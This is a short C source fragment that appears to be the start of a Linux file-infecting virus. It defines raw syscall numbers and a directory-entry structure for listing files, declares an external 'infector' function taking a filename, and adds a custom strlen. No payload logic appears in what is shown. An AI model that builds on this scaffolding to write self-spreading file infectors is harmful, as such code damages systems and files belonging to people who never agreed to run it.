#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <string.h>
#include <dirent.h>

#define SYS_open 5
#define SYS_read 3
#define SYS_write 4
#define SYS_close 6
#define SYS_getdents 141

extern void infector(char *filename); 

#define BUF_SIZE 8192 /* Buffer size to store directory entries */

struct linux_dirent {
    unsigned long  d_ino;
    unsigned short d_reclen;
    unsigned char  d_type;
    char           d_name[];
};

/* Custom strlen function */
int my_strlen(const char *str) {
    int len = 0;
    while (str[len] != '\0') {
        len++;
    }
    return len;
}